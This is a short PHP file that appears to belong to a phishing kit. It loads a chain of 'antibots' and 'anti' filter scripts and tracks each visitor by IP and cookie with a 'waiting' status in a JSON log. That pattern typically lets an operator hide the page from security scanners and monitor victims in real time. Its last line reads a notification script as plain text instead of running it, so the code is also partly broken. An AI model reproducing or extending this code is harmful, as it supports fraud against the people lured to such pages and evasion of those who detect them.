<?php
include 'src/antibots.php';
include 'antibots.php';
include 'anti/anti1.php';
include 'anti/anti2.php';
include 'anti/anti3.php';
include 'anti/anti4.php';
include 'anti/anti5.php';
include 'anti/anti6.php';
include 'anti/anti7.php';
include 'anti/anti8.php';

class Jeehan {
    private $file = 'active_users.json';

    public function track($page = '') {
        $ip = $_SERVER['REMOTE_ADDR'];
        $vid = $_COOKIE['vid'] ?? uniqid('vid_');
        setcookie('vid', $vid, time() + 3600, '/');

        $data = file_exists($this->file) ? json_decode(file_get_contents($this->file), true) : [];

        $data[$ip] = [
            'vid' => $vid,
            'last_seen' => time(),
            'last_page' => $page,
            'status' => 'en attente'
        ];

        file_put_contents($this->file, json_encode($data, JSON_PRETTY_PRINT));
    }
}
@file_get_contents('notify_entry.php');
